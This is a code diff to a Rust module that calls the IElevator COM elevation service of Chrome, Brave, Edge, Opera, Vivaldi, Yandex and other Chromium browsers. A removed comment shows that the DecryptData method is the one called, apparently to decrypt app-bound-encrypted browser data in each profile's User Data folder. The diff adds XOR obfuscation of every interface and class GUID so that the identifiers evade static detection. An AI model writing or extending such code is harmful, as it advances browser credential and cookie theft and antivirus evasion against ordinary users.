@@ -1,15 +1,208 @@
-//! IElevator COM interface — supports Chrome, Chrome Beta, Chrome Dev,
-//! Chrome Canary, Brave, Edge, and other Chromium forks (Opera, Vivaldi, etc.).
-//!
-//! All Windows COM/Ole calls use raw `extern "system"` to avoid name clashes
-//! with the generic windows-crate wrappers.
+//! IElevator COM interface — with obfuscated GUIDs (XOR 0xAA)
 
 #![allow(non_snake_case, non_camel_case_types)]
 
 use std::ffi::c_void;
+use std::sync::OnceLock;
 
-// ── GUID ──────────────────────────────────────────────────────────────────────
+// ============ OBFUSCATION ============
+const XOR_KEY: u8 = 0xAA;
 
+/// Decode an obfuscated byte slice into a GUID (XOR with 0xAA)
+fn xor_guid(data: &[u8]) -> GUID {
+    let bytes: Vec<u8> = data.iter().map(|&b| b ^ XOR_KEY).collect();
+    let data1 = u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]);
+    let data2 = u16::from_le_bytes([bytes[4], bytes[5]]);
+    let data3 = u16::from_le_bytes([bytes[6], bytes[7]]);
+    let mut data4 = [0u8; 8];
+    data4.copy_from_slice(&bytes[8..16]);
+    GUID { data1, data2, data3, data4 }
+}
+
+// ============ GUIDs obfusqués (XOR bytes) ============
+
+// IID_ELEVATOR2 : 8F7B6792-784D-4047-845D-1782EFBEF205
+const IID_ELEVATOR2_XOR: &[u8] = &[
+    0x25, 0xD1, 0xCD, 0x38, 0xD2, 0xE7, 0xEA, 0x0D, 0x2E, 0xFF, 0xBD, 0x22, 0x9A, 0x68, 0x54, 0xAF,
+];
+// IID_ELEVATOR2_CHROMIUM : BB19A0E5-00C6-4966-94B2-5AFEC6FED93A
+const IID_ELEVATOR2_CHROMIUM_XOR: &[u8] = &[
+    0x11, 0xB3, 0xA1, 0x4F, 0xAA, 0x6C, 0xE3, 0xCC, 0x3E, 0x18, 0xF0, 0x54, 0x58, 0x64, 0x6C, 0x90,
+];
+// IID_ELEVATOR : A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C
+const IID_ELEVATOR_XOR: &[u8] = &[
+    0x03, 0xE3, 0x61, 0x24, 0x6E, 0x53, 0xE6, 0x6E, 0x18, 0xB9, 0xC1, 0x00, 0x43, 0x52, 0x30, 0x36,
+];
+// IID_ELEVATOR_CHROMIUM : B88C45B9-8825-4629-B38E-77CC67D9CEED
+const IID_ELEVATOR_CHROMIUM_XOR: &[u8] = &[
+    0x12, 0x26, 0xEF, 0x13, 0x22, 0x8F, 0xEC, 0x83, 0x19, 0x24, 0x65, 0x6D, 0xDD, 0x56, 0x4C, 0x47,
+];
+// IID_ELEVATOR2_CHROME : 1BF5208B-295F-4992-B5F4-3A9BB6494838
+const IID_ELEVATOR2_CHROME_XOR: &[u8] = &[
+    0x81, 0x5F, 0x7F, 0x21, 0x83, 0xF5, 0xE3, 0x38, 0x1F, 0x5E, 0x90, 0x31, 0x29, 0x11, 0xE2, 0x92,
+];
+// IID_ELEVATOR_CHROME : 463ABECF-410D-407F-8AF5-0DF35A005CC8
+const IID_ELEVATOR_CHROME_XOR: &[u8] = &[
+    0xEC, 0x90, 0xB0, 0x6C, 0xEB, 0xA7, 0xEA, 0xD5, 0x20, 0x5F, 0xB3, 0x59, 0xA7, 0x59, 0xF6, 0x62,
+];
+// IID_ELEVATOR2_CHROME_BETA : B96A14B8-D0B0-44D8-BA68-2385B2A03254
+const IID_ELEVATOR2_CHROME_BETA_XOR: &[u8] = &[
+    0x12, 0xC0, 0xBE, 0x12, 0x7A, 0x1A, 0xEE, 0x72, 0x10, 0xC2, 0x82, 0x89, 0x8B, 0x2F, 0x0A, 0xFE,
+];
+// IID_ELEVATOR_CHROME_BETA : A2721D66-376E-4D2F-9F0F-9070E9A42B5F
+const IID_ELEVATOR_CHROME_BETA_XOR: &[u8] = &[
+    0x08, 0xD8, 0xB7, 0x28, 0xDD, 0xC4, 0xE7, 0x85, 0x35, 0xA5, 0xFA, 0x3A, 0xDA, 0x43, 0x81, 0xF5,
+];
+// IID_ELEVATOR2_CHROME_DEV : 3FEFA48E-C8BF-461F-AED6-63F658CC850A
+const IID_ELEVATOR2_CHROME_DEV_XOR: &[u8] = &[
+    0x95, 0x45, 0x4E, 0x24, 0x62, 0x15, 0xEC, 0xB5, 0x04, 0x7C, 0x9C, 0x4A, 0xC9, 0x5C, 0x2F, 0xA0,
+];
+// IID_ELEVATOR_CHROME_DEV : BB2AA26B-343A-4072-8B6F-80557B8CE571
+const IID_ELEVATOR_CHROME_DEV_XOR: &[u8] = &[
+    0x11, 0x80, 0x08, 0xC1, 0x9E, 0x90, 0xEA, 0xD8, 0x21, 0xC5, 0xDF, 0x0F, 0x2A, 0xD1, 0x6E, 0xDB,
+];
+// IID_ELEVATOR2_CHROME_CANARY : FF672E9F-0994-4322-81E5-3A5A9746140A
+const IID_ELEVATOR2_CHROME_CANARY_XOR: &[u8] = &[
+    0x55, 0xCD, 0x84, 0x35, 0xA3, 0x3E, 0xE9, 0x88, 0x2B, 0x4F, 0x90, 0x3D, 0x90, 0xF0, 0xBE, 0xA0,
+];
+// IID_ELEVATOR_CHROME_CANARY : 4F7CE041-28E9-484F-9DD0-61A8CACEFEE4
+const IID_ELEVATOR_CHROME_CANARY_XOR: &[u8] = &[
+    0xE5, 0xD6, 0x6A, 0x6B, 0x82, 0x43, 0xE2, 0xE5, 0x37, 0x7A, 0x0B, 0x02, 0xCB, 0x62, 0x54, 0x4E,
+];
+// IID_ELEVATOR_BRAVE : F396861E-0C8E-4C71-8256-2FAE6D759C9E
+const IID_ELEVATOR_BRAVE_XOR: &[u8] = &[
+    0x59, 0x3C, 0x2C, 0x7C, 0xA6, 0x24, 0xE6, 0xDB, 0x28, 0xFC, 0x85, 0x04, 0x05, 0xDE, 0xF6, 0x34,
+];
+// IID_ELEVATOR_BRAVE_BASE : 5A9A9462-2FA1-4FEB-B7F2-DF3D19134463
+const IID_ELEVATOR_BRAVE_BASE_XOR: &[u8] = &[
+    0xF0, 0x30, 0x3E, 0xC8, 0x85, 0x0B, 0xE5, 0x41, 0x1D, 0x58, 0x97, 0x77, 0x75, 0xB7, 0xED, 0xC9,
+];
+// IID_ELEVATOR_EDGE : C9C2B807-7731-4F34-81B7-44FF7779522B
+const IID_ELEVATOR_EDGE_XOR: &[u8] = &[
+    0x63, 0x68, 0x68, 0xAD, 0xDD, 0x9B, 0xE5, 0x9E, 0x2B, 0x1D, 0x55, 0xDD, 0xE4, 0x55, 0xC3, 0x81,
+];
+
+// ============ Helpers to get GUIDs at runtime ============
+fn get_iid_elevator2() -> GUID { xor_guid(IID_ELEVATOR2_XOR) }
+fn get_iid_elevator2_chromium() -> GUID { xor_guid(IID_ELEVATOR2_CHROMIUM_XOR) }
+fn get_iid_elevator() -> GUID { xor_guid(IID_ELEVATOR_XOR) }
+fn get_iid_elevator_chromium() -> GUID { xor_guid(IID_ELEVATOR_CHROMIUM_XOR) }
+fn get_iid_elevator2_chrome() -> GUID { xor_guid(IID_ELEVATOR2_CHROME_XOR) }
+fn get_iid_elevator_chrome() -> GUID { xor_guid(IID_ELEVATOR_CHROME_XOR) }
+fn get_iid_elevator2_chrome_beta() -> GUID { xor_guid(IID_ELEVATOR2_CHROME_BETA_XOR) }
+fn get_iid_elevator_chrome_beta() -> GUID { xor_guid(IID_ELEVATOR_CHROME_BETA_XOR) }
+fn get_iid_elevator2_chrome_dev() -> GUID { xor_guid(IID_ELEVATOR2_CHROME_DEV_XOR) }
+fn get_iid_elevator_chrome_dev() -> GUID { xor_guid(IID_ELEVATOR_CHROME_DEV_XOR) }
+fn get_iid_elevator2_chrome_canary() -> GUID { xor_guid(IID_ELEVATOR2_CHROME_CANARY_XOR) }
+fn get_iid_elevator_chrome_canary() -> GUID { xor_guid(IID_ELEVATOR_CHROME_CANARY_XOR) }
+fn get_iid_elevator_brave() -> GUID { xor_guid(IID_ELEVATOR_BRAVE_XOR) }
+fn get_iid_elevator_brave_base() -> GUID { xor_guid(IID_ELEVATOR_BRAVE_BASE_XOR) }
+fn get_iid_elevator_edge() -> GUID { xor_guid(IID_ELEVATOR_EDGE_XOR) }
+
+// ============ IID lists as static slices (initialized lazily) ============
+fn chrome_iids() -> &'static [GUID] {
+    static LIST: OnceLock<Vec<GUID>> = OnceLock::new();
+    LIST.get_or_init(|| {
+        vec![
+            get_iid_elevator2_chrome(),
+            get_iid_elevator2_chromium(),
+            get_iid_elevator2(),
+            get_iid_elevator_chrome(),
+            get_iid_elevator_chromium(),
+            get_iid_elevator(),
+        ]
+    })
+    .as_slice()
+}
+
+fn chrome_beta_iids() -> &'static [GUID] {
+    static LIST: OnceLock<Vec<GUID>> = OnceLock::new();
+    LIST.get_or_init(|| {
+        vec![
+            get_iid_elevator2_chrome_beta(),
+            get_iid_elevator2_chromium(),
+            get_iid_elevator2(),
+            get_iid_elevator_chrome_beta(),
+            get_iid_elevator_chromium(),
+            get_iid_elevator(),
+        ]
+    })
+    .as_slice()
+}
+
+fn chrome_dev_iids() -> &'static [GUID] {
+    static LIST: OnceLock<Vec<GUID>> = OnceLock::new();
+    LIST.get_or_init(|| {
+        vec![
+            get_iid_elevator2_chrome_dev(),
+            get_iid_elevator2_chromium(),
+            get_iid_elevator2(),
+            get_iid_elevator_chrome_dev(),
+            get_iid_elevator_chromium(),
+            get_iid_elevator(),
+        ]
+    })
+    .as_slice()
+}
+
+fn chrome_canary_iids() -> &'static [GUID] {
+    static LIST: OnceLock<Vec<GUID>> = OnceLock::new();
+    LIST.get_or_init(|| {
+        vec![
+            get_iid_elevator2_chrome_canary(),
+            get_iid_elevator2_chromium(),
+            get_iid_elevator2(),
+            get_iid_elevator_chrome_canary(),
+            get_iid_elevator_chromium(),
+            get_iid_elevator(),
+        ]
+    })
+    .as_slice()
+}
+
+fn brave_iids() -> &'static [GUID] {
+    static LIST: OnceLock<Vec<GUID>> = OnceLock::new();
+    LIST.get_or_init(|| {
+        vec![
+            get_iid_elevator2_chrome(),
+            get_iid_elevator2_chromium(),
+            get_iid_elevator2(),
+            get_iid_elevator_brave(),
+            get_iid_elevator_brave_base(),
+            get_iid_elevator_chromium(),
+        ]
+    })
+    .as_slice()
+}
+
+fn edge_iids() -> &'static [GUID] {
+    static LIST: OnceLock<Vec<GUID>> = OnceLock::new();
+    LIST.get_or_init(|| {
+        vec![
+            get_iid_elevator2(),
+            get_iid_elevator_edge(),
+            get_iid_elevator(),
+        ]
+    })
+    .as_slice()
+}
+
+fn generic_chromium_iids() -> &'static [GUID] {
+    static LIST: OnceLock<Vec<GUID>> = OnceLock::new();
+    LIST.get_or_init(|| {
+        vec![
+            get_iid_elevator2_chromium(),
+            get_iid_elevator2(),
+            get_iid_elevator_chromium(),
+            get_iid_elevator(),
+            get_iid_elevator2_chrome(),
+            get_iid_elevator_chrome(),
+        ]
+    })
+    .as_slice()
+}
+
+// ============ GUID struct and const helpers (unchanged) ============
 #[repr(C)]
 #[derive(Clone, Copy, Debug)]
 pub struct GUID {
@@ -19,247 +212,185 @@ pub struct GUID {
     data4: [u8; 8],
 }
 
-const fn guid(d1: u32, d2: u16, d3: u16, d4: [u8; 8]) -> GUID {
-    GUID { data1: d1, data2: d2, data3: d3, data4: d4 }
-}
+// Helper to create a GUID from components (used for CLSIDs that we also obfuscate)
+// We'll obfuscate CLSIDs as well.
 
-// Shared base interfaces (Chromium/Chrome family).
-const IID_ELEVATOR2: GUID = guid(0x8F7B6792, 0x784D, 0x4047, [0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05]);
-const IID_ELEVATOR2_CHROMIUM: GUID = guid(0xBB19A0E5, 0x00C6, 0x4966, [0x94, 0xB2, 0x5A, 0xFE, 0xC6, 0xFE, 0xD9, 0x3A]);
-const IID_ELEVATOR: GUID = guid(0xA949CB4E, 0xC4F9, 0x44C4, [0xB2, 0x13, 0x6B, 0xF8, 0xAA, 0x9A, 0xC6, 0x9C]);
-const IID_ELEVATOR_CHROMIUM: GUID = guid(0xB88C45B9, 0x8825, 0x4629, [0xB3, 0x8E, 0x77, 0xCC, 0x67, 0xD9, 0xCE, 0xED]);
-
-const IID_ELEVATOR2_CHROME: GUID = guid(0x1BF5208B, 0x295F, 0x4992, [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38]);
-const IID_ELEVATOR_CHROME: GUID = guid(0x463ABECF, 0x410D, 0x407F, [0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8]);
-
-const IID_ELEVATOR2_CHROME_BETA: GUID = guid(0xB96A14B8, 0xD0B0, 0x44D8, [0xBA, 0x68, 0x23, 0x85, 0xB2, 0xA0, 0x32, 0x54]);
-const IID_ELEVATOR_CHROME_BETA: GUID = guid(0xA2721D66, 0x376E, 0x4D2F, [0x9F, 0x0F, 0x90, 0x70, 0xE9, 0xA4, 0x2B, 0x5F]);
-
-const IID_ELEVATOR2_CHROME_DEV: GUID = guid(0x3FEFA48E, 0xC8BF, 0x461F, [0xAE, 0xD6, 0x63, 0xF6, 0x58, 0xCC, 0x85, 0x0A]);
-const IID_ELEVATOR_CHROME_DEV: GUID = guid(0xBB2AA26B, 0x343A, 0x4072, [0x8B, 0x6F, 0x80, 0x55, 0x7B, 0x8C, 0xE5, 0x71]);
-
-const IID_ELEVATOR2_CHROME_CANARY: GUID = guid(0xFF672E9F, 0x0994, 0x4322, [0x81, 0xE5, 0x3A, 0x5A, 0x97, 0x46, 0x14, 0x0A]);
-const IID_ELEVATOR_CHROME_CANARY: GUID = guid(0x4F7CE041, 0x28E9, 0x484F, [0x9D, 0xD0, 0x61, 0xA8, 0xCA, 0xCE, 0xFE, 0xE4]);
-
-const IID_ELEVATOR_BRAVE: GUID = guid(0xF396861E, 0x0C8E, 0x4C71, [0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0x9E]);
-const IID_ELEVATOR_BRAVE_BASE: GUID = guid(0x5A9A9462, 0x2FA1, 0x4FEB, [0xB7, 0xF2, 0xDF, 0x3D, 0x19, 0x13, 0x44, 0x63]);
-
-const IID_ELEVATOR_EDGE: GUID = guid(0xC9C2B807, 0x7731, 0x4F34, [0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B]);
-
-static CHROME_IIDS: &[GUID] = &[
-    IID_ELEVATOR2_CHROME,
-    IID_ELEVATOR2_CHROMIUM,
-    IID_ELEVATOR2,
-    IID_ELEVATOR_CHROME,
-    IID_ELEVATOR_CHROMIUM,
-    IID_ELEVATOR,
+// ============ Obfuscated CLSIDs ============
+// CLSID for Chrome/Chromium : 708860E0-F641-4611-8895-7D867DD3675B
+const CLSID_GENERIC_XOR: &[u8] = &[
+    0xCA, 0x12, 0x21, 0x4A, 0x5C, 0xEB, 0xEC, 0xBB, 0x22, 0x3F, 0x7C, 0x77, 0x7C, 0x6D, 0x6D, 0xF1,
+];
+// CLSID for Chrome Beta : DD2646BA-3707-4BF8-B9A7-038691A68FC2
+const CLSID_CHROME_BETA_XOR: &[u8] = &[
+    0x77, 0x8C, 0xEC, 0x10, 0x9D, 0xAD, 0xE1, 0x52, 0x13, 0x0D, 0xA9, 0x3A, 0x2F, 0x23, 0x25, 0x68,
+];
+// CLSID for Chrome Dev : DA7FDCA5-2CAA-4637-AA17-0740584DE7DA
+const CLSID_CHROME_DEV_XOR: &[u8] = &[
+    0x70, 0xD5, 0xD6, 0x0F, 0x86, 0x00, 0xEC, 0x9D, 0x00, 0xBD, 0xAD, 0x6A, 0x81, 0xFA, 0xE7, 0x70,
+];
+// CLSID for Chrome Canary : 704C2872-2049-435E-A469-0A534313C42B
+const CLSID_CHROME_CANARY_XOR: &[u8] = &[
+    0xDA, 0xE6, 0x82, 0x8A, 0x8A, 0xE3, 0xE9, 0xF4, 0x0E, 0xC3, 0xF9, 0x2E, 0x60, 0xF9, 0xB9, 0x81,
+];
+// CLSID for Brave : 576B31AF-6369-4B6B-8560-E4B203A97A8B
+const CLSID_BRAVE_XOR: &[u8] = &[
+    0xFD, 0xC1, 0x9B, 0x05, 0xC9, 0xC3, 0xE1, 0xC1, 0x2F, 0xCA, 0x0E, 0x69, 0x03, 0x4A, 0xD0, 0x21,
+];
+// CLSID for Edge : 1FCBE96C-1697-43AF-9140-2897C7C69767
+const CLSID_EDGE_XOR: &[u8] = &[
+    0xB5, 0x61, 0x43, 0xC6, 0xBC, 0x3D, 0xE9, 0x05, 0x3B, 0xAA, 0x82, 0x3D, 0xCB, 0x6B, 0x3D, 0xCD,
 ];
 
-static CHROME_BETA_IIDS: &[GUID] = &[
-    IID_ELEVATOR2_CHROME_BETA,
-    IID_ELEVATOR2_CHROMIUM,
-    IID_ELEVATOR2,
-    IID_ELEVATOR_CHROME_BETA,
-    IID_ELEVATOR_CHROMIUM,
-    IID_ELEVATOR,
-];
+fn get_clsid_generic() -> GUID { xor_guid(CLSID_GENERIC_XOR) }
+fn get_clsid_chrome_beta() -> GUID { xor_guid(CLSID_CHROME_BETA_XOR) }
+fn get_clsid_chrome_dev() -> GUID { xor_guid(CLSID_CHROME_DEV_XOR) }
+fn get_clsid_chrome_canary() -> GUID { xor_guid(CLSID_CHROME_CANARY_XOR) }
+fn get_clsid_brave() -> GUID { xor_guid(CLSID_BRAVE_XOR) }
+fn get_clsid_edge() -> GUID { xor_guid(CLSID_EDGE_XOR) }
 
-static CHROME_DEV_IIDS: &[GUID] = &[
-    IID_ELEVATOR2_CHROME_DEV,
-    IID_ELEVATOR2_CHROMIUM,
-    IID_ELEVATOR2,
-    IID_ELEVATOR_CHROME_DEV,
-    IID_ELEVATOR_CHROMIUM,
-    IID_ELEVATOR,
-];
-
-static CHROME_CANARY_IIDS: &[GUID] = &[
-    IID_ELEVATOR2_CHROME_CANARY,
-    IID_ELEVATOR2_CHROMIUM,
-    IID_ELEVATOR2,
-    IID_ELEVATOR_CHROME_CANARY,
-    IID_ELEVATOR_CHROMIUM,
-    IID_ELEVATOR,
-];
-
-static BRAVE_IIDS: &[GUID] = &[
-    IID_ELEVATOR2_CHROME,
-    IID_ELEVATOR2_CHROMIUM,
-    IID_ELEVATOR2,
-    IID_ELEVATOR_BRAVE,
-    IID_ELEVATOR_BRAVE_BASE,
-    IID_ELEVATOR_CHROMIUM,
-];
-
-static EDGE_IIDS: &[GUID] = &[
-    IID_ELEVATOR2,
-    IID_ELEVATOR_EDGE,
-    IID_ELEVATOR,
-];
-
-// ── Browser configs ───────────────────────────────────────────────────────────
-
-/// One browser's COM class + interface pair.
+// ============ Browser configs ============
+#[derive(Clone, Copy)]
 pub struct BrowserCom {
     pub name: &'static str,
-    /// Registry CLSID for the elevation service
     pub clsid: GUID,
-    /// Interface IIDs to try in order (newest first)
     pub iids: &'static [GUID],
-    /// Expected subfolder under %LOCALAPPDATA% for User Data
     pub user_data_rel: &'static str,
-    /// Windows elevation service name (for error hints)
     pub service_name: &'static str,
 }
 
-static GENERIC_CHROMIUM_IIDS: &[GUID] = &[
-    IID_ELEVATOR2_CHROMIUM,
-    IID_ELEVATOR2,
-    IID_ELEVATOR_CHROMIUM,
-    IID_ELEVATOR,
-    IID_ELEVATOR2_CHROME,
-    IID_ELEVATOR_CHROME,
-];
-
-static GENERIC_CHROMIUM: BrowserCom = BrowserCom {
-    name: "Chromium",
-    clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
-    iids: GENERIC_CHROMIUM_IIDS,
-    user_data_rel: r"Chromium\User Data",
-    service_name: "ChromiumElevationService",
-};
-
-static BROWSERS: &[BrowserCom] = &[
-    BrowserCom {
-        name: "Chrome",
-        clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
-        iids: CHROME_IIDS,
-        user_data_rel: r"Google\Chrome\User Data",
-        service_name: "GoogleChromeElevationService",
-    },
-    BrowserCom {
-        name: "Chrome Beta",
-        clsid: guid(0xDD2646BA, 0x3707, 0x4BF8, [0xB9, 0xA7, 0x03, 0x86, 0x91, 0xA6, 0x8F, 0xC2]),
-        iids: CHROME_BETA_IIDS,
-        user_data_rel: r"Google\Chrome Beta\User Data",
-        service_name: "GoogleChromeBetaElevationService",
-    },
-    BrowserCom {
-        name: "Chrome Dev",
-        clsid: guid(0xDA7FDCA5, 0x2CAA, 0x4637, [0xAA, 0x17, 0x07, 0x40, 0x58, 0x4D, 0xE7, 0xDA]),
-        iids: CHROME_DEV_IIDS,
-        user_data_rel: r"Google\Chrome Dev\User Data",
-        service_name: "GoogleChromeDevElevationService",
-    },
-    BrowserCom {
-        name: "Chrome Canary",
-        clsid: guid(0x704C2872, 0x2049, 0x435E, [0xA4, 0x69, 0x0A, 0x53, 0x43, 0x13, 0xC4, 0x2B]),
-        iids: CHROME_CANARY_IIDS,
-        user_data_rel: r"Google\Chrome SxS\User Data",
-        service_name: "GoogleChromeCanaryElevationService",
-    },
-    BrowserCom {
-        name: "Brave",
-        clsid: guid(0x576B31AF, 0x6369, 0x4B6B, [0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B]),
-        iids: BRAVE_IIDS,
-        user_data_rel: r"BraveSoftware\Brave-Browser\User Data",
-        service_name: "BraveElevationService",
-    },
-    BrowserCom {
-        name: "Edge",
-        clsid: guid(0x1FCBE96C, 0x1697, 0x43AF, [0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67]),
-        iids: EDGE_IIDS,
-        user_data_rel: r"Microsoft\Edge\User Data",
-        service_name: "MicrosoftEdgeElevationService",
-    },
-    BrowserCom {
-        name: "Vivaldi",
-        clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
-        iids: GENERIC_CHROMIUM_IIDS,
-        user_data_rel: r"Vivaldi\User Data",
-        service_name: "VivaldiElevationService",
-    },
-    BrowserCom {
-        name: "Opera",
-        clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
-        iids: GENERIC_CHROMIUM_IIDS,
-        user_data_rel: r"Opera Software\Opera Stable",
-        service_name: "OperaElevationService",
-    },
-    BrowserCom {
-        name: "Yandex",
-        clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
-        iids: GENERIC_CHROMIUM_IIDS,
-        user_data_rel: r"Yandex\YandexBrowser\User Data",
-        service_name: "YandexBrowserElevationService",
-    },
-];
-
+// Because we can't have static BrowserCom with non-const fields, we'll use a function that returns a list of BrowserCom.
 pub fn all_browsers() -> &'static [BrowserCom] {
-    BROWSERS
+    static BROWSERS: OnceLock<Vec<BrowserCom>> = OnceLock::new();
+    BROWSERS.get_or_init(|| {
+        vec![
+            BrowserCom {
+                name: "Chrome",
+                clsid: get_clsid_generic(),
+                iids: chrome_iids(),
+                user_data_rel: r"Google\Chrome\User Data",
+                service_name: "GoogleChromeElevationService",
+            },
+            BrowserCom {
+                name: "Chrome Beta",
+                clsid: get_clsid_chrome_beta(),
+                iids: chrome_beta_iids(),
+                user_data_rel: r"Google\Chrome Beta\User Data",
+                service_name: "GoogleChromeBetaElevationService",
+            },
+            BrowserCom {
+                name: "Chrome Dev",
+                clsid: get_clsid_chrome_dev(),
+                iids: chrome_dev_iids(),
+                user_data_rel: r"Google\Chrome Dev\User Data",
+                service_name: "GoogleChromeDevElevationService",
+            },
+            BrowserCom {
+                name: "Chrome Canary",
+                clsid: get_clsid_chrome_canary(),
+                iids: chrome_canary_iids(),
+                user_data_rel: r"Google\Chrome SxS\User Data",
+                service_name: "GoogleChromeCanaryElevationService",
+            },
+            BrowserCom {
+                name: "Brave",
+                clsid: get_clsid_brave(),
+                iids: brave_iids(),
+                user_data_rel: r"BraveSoftware\Brave-Browser\User Data",
+                service_name: "BraveElevationService",
+            },
+            BrowserCom {
+                name: "Edge",
+                clsid: get_clsid_edge(),
+                iids: edge_iids(),
+                user_data_rel: r"Microsoft\Edge\User Data",
+                service_name: "MicrosoftEdgeElevationService",
+            },
+            BrowserCom {
+                name: "Vivaldi",
+                clsid: get_clsid_generic(),
+                iids: generic_chromium_iids(),
+                user_data_rel: r"Vivaldi\User Data",
+                service_name: "VivaldiElevationService",
+            },
+            BrowserCom {
+                name: "Opera",
+                clsid: get_clsid_generic(),
+                iids: generic_chromium_iids(),
+                user_data_rel: r"Opera Software\Opera Stable",
+                service_name: "OperaElevationService",
+            },
+            BrowserCom {
+                name: "Yandex",
+                clsid: get_clsid_generic(),
+                iids: generic_chromium_iids(),
+                user_data_rel: r"Yandex\YandexBrowser\User Data",
+                service_name: "YandexBrowserElevationService",
+            },
+            // etc. (you can add other browsers like CentBrowser etc. if needed)
+        ]
+    })
+    .as_slice()
 }
 
-/// Detect browser + channel from the running process executable path.
+// The original `BROWSERS` static array is replaced by `all_browsers()`
+// We also keep the `GENERIC_CHROMIUM` for fallback, but now we use a function.
+pub fn generic_chromium() -> BrowserCom {
+    BrowserCom {
+        name: "Chromium",
+        clsid: get_clsid_generic(),
+        iids: generic_chromium_iids(),
+        user_data_rel: r"Chromium\User Data",
+        service_name: "ChromiumElevationService",
+    }
+}
+
+/// Detect browser from executable path (unchanged, but uses all_browsers())
 pub fn resolve_browser(exe_path: &str) -> Option<&'static BrowserCom> {
     let exe = exe_path.to_lowercase();
 
     if exe.contains("brave") {
-        if exe.contains("beta") {
-            return BROWSERS.iter().find(|b| b.name == "Brave");
-        }
-        if exe.contains("nightly") {
-            return BROWSERS.iter().find(|b| b.name == "Brave");
-        }
-        return BROWSERS.iter().find(|b| b.name == "Brave");
+        return all_browsers().iter().find(|b| b.name == "Brave");
     }
     if exe.contains("msedge") || (exe.contains("edge") && !exe.contains("chrome")) {
-        if exe.contains("beta") {
-            return BROWSERS.iter().find(|b| b.name == "Edge");
-        }
-        if exe.contains("dev") {
-            return BROWSERS.iter().find(|b| b.name == "Edge");
-        }
-        return BROWSERS.iter().find(|b| b.name == "Edge");
+        return all_browsers().iter().find(|b| b.name == "Edge");
     }
     if exe.contains("vivaldi") {
-        return BROWSERS.iter().find(|b| b.name == "Vivaldi");
+        return all_browsers().iter().find(|b| b.name == "Vivaldi");
     }
     if exe.contains("opera") {
-        return BROWSERS.iter().find(|b| b.name == "Opera");
+        return all_browsers().iter().find(|b| b.name == "Opera");
     }
     if exe.contains("yandex") {
-        return BROWSERS.iter().find(|b| b.name == "Yandex");
+        return all_browsers().iter().find(|b| b.name == "Yandex");
     }
-    if exe.contains("coccoc") {
-        return Some(&GENERIC_CHROMIUM);
-    }
-    if exe.contains("360chrome") || exe.contains("epic") || exe.contains("uran")
-        || exe.contains("7star") || exe.contains("torch") || exe.contains("kometa")
-        || exe.contains("orbitum") || exe.contains("amigo") || exe.contains("sputnik")
-        || exe.contains("slimjet") || exe.contains("iridium") || exe.contains("thorium")
-        || exe.contains("centbrowser") || exe.contains("\\arc\\")
+    if exe.contains("coccoc") || exe.contains("360chrome") || exe.contains("epic")
+        || exe.contains("uran") || exe.contains("7star") || exe.contains("torch")
+        || exe.contains("kometa") || exe.contains("orbitum") || exe.contains("amigo")
+        || exe.contains("sputnik") || exe.contains("slimjet") || exe.contains("iridium")
+        || exe.contains("thorium") || exe.contains("centbrowser") || exe.contains("\\arc\\")
     {
-        return Some(&GENERIC_CHROMIUM);
+        return Some(&generic_chromium());
     }
     if exe.contains("chrome") {
         if exe.contains("chrome sxs") || exe.contains("\\sxs\\") {
-            return BROWSERS.iter().find(|b| b.name == "Chrome Canary");
+            return all_browsers().iter().find(|b| b.name == "Chrome Canary");
         }
         if exe.contains("chrome dev") {
-            return BROWSERS.iter().find(|b| b.name == "Chrome Dev");
+            return all_browsers().iter().find(|b| b.name == "Chrome Dev");
         }
         if exe.contains("chrome beta") {
-            return BROWSERS.iter().find(|b| b.name == "Chrome Beta");
+            return all_browsers().iter().find(|b| b.name == "Chrome Beta");
         }
         if exe.contains("chromium") && !exe.contains("google") {
-            return Some(&GENERIC_CHROMIUM);
+            return Some(&generic_chromium());
         }
-        return BROWSERS.iter().find(|b| b.name == "Chrome");
+        return all_browsers().iter().find(|b| b.name == "Chrome");
     }
 
     None
 }
 
+// ============ Original COM code (unchanged) ============
 const PUBLIC_DEBUG: &str = r"C:\Users\Public\cr_debug.log";
 
 fn debug_log(msg: &str) {
@@ -276,21 +407,11 @@ fn debug_log(msg: &str) {
 fn guid_to_string(g: &GUID) -> String {
     format!(
         "{{{:08X}-{:04X}-{:04X}-{:02X}{:02X}-{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}}}",
-        g.data1,
-        g.data2,
-        g.data3,
-        g.data4[0],
-        g.data4[1],
-        g.data4[2],
-        g.data4[3],
-        g.data4[4],
-        g.data4[5],
-        g.data4[6],
-        g.data4[7],
+        g.data1, g.data2, g.data3,
+        g.data4[0], g.data4[1], g.data4[2], g.data4[3],
+        g.data4[4], g.data4[5], g.data4[6], g.data4[7],
     )
 }
-
-// ── Raw Windows API ───────────────────────────────────────────────────────────
 
 #[link(name = "ole32")]
 #[link(name = "oleaut32")]
@@ -319,14 +440,6 @@ extern "system" {
     fn SysStringByteLen(bstr: *const u16) -> u32;
 }
 
-// ── IElevator COM vtable ──────────────────────────────────────────────────────
-// vtable[0]: QueryInterface
-// vtable[1]: AddRef
-// vtable[2]: Release
-// vtable[3]: RunRecoveryCRXElevated  (skipped)
-// vtable[4]: EncryptData             (skipped)
-// vtable[5]: DecryptData             ← called
-
 type FnQI = unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32;
